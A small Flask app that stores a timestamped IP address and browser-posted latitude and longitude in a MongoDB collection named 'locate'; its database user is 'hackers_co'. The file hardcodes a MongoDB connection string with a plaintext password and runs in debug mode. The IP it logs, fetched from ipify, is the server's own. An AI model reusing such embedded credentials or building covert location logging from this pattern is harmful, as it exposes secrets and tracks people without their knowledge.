
from flask import Flask, render_template, request
import requests
from pymongo import MongoClient
import json
import pytz
from datetime import datetime

app = Flask(__name__)
connection_string = 'mongodb+srv://hackers_co:K9mDEAed8NYtQeLd@blog.xk7q6yw.mongodb.net/'
client = MongoClient(connection_string)
db = client["locate"]  # Update with your MongoDB database name
info = db["info"]

@app.route('/', methods=['GET', 'POST'])
def index():
    # if request.method == 'POST':
        response = requests.get("https://api.ipify.org/?format=json")
        data = json.loads(response.text)
        ip_address = data['ip']
        # print(ip_address)
        ist = pytz.timezone('Asia/Kolkata')
    # current_time = datetime.now(ist)
        current_date = datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")
        info.insert_one({'ipAddress':ip_address,'date':current_date})
        # Parse and process the IP address as needed
        # Fetch ISP details using an appropriate method
        # return "ISP Details: ..."
        return render_template('index.html') 

    # else:
        # return render_template('index.html')
    # return render_template('index.html')


@app.route('/send_location', methods=['POST'])
def send_location():
    data = request.get_json()
    latitude = data['latitude']
    longitude = data['longitude']
    ist = pytz.timezone('Asia/Kolkata')
    # current_time = datetime.now(ist)
    current_date = datetime.now(ist).strftime("%Y-%m-%d %H:%M:%S")
    info.insert_one({'latitude': latitude, 'longitude': longitude,'date':current_date})

    # print(f'Received Geolocation Data - Latitude: {latitude}, Longitude: {longitude}')
    
    return ''

if __name__ == '__main__':
    app.run(debug=True)
    # from waitress import serve
    # serve(app, host="0.0.0.0", port=8080)

